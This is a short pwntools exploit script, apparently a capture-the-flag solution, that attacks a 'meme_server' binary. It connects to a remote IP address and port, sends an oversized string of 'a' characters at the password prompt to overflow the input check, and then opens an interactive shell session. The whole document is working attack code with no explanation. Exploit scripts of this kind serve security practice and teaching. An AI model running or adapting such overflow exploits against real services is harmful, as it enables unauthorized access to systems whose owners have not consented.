#! /usr/bin/env python
# -*- coding: utf-8 -*-
# Distributed under terms of the MIT license.
# Author = nepire
#
from pwn import*
context(os='linux',arch='i386',log_level='debug')
#n = process('./meme_server')
n = remote('185.66.87.233',5004)
elf = ELF('./meme_server')
libc = elf.libc

n.recvuntil('password: ')
n.sendline('a'*(0x29-9))

n.interactive()
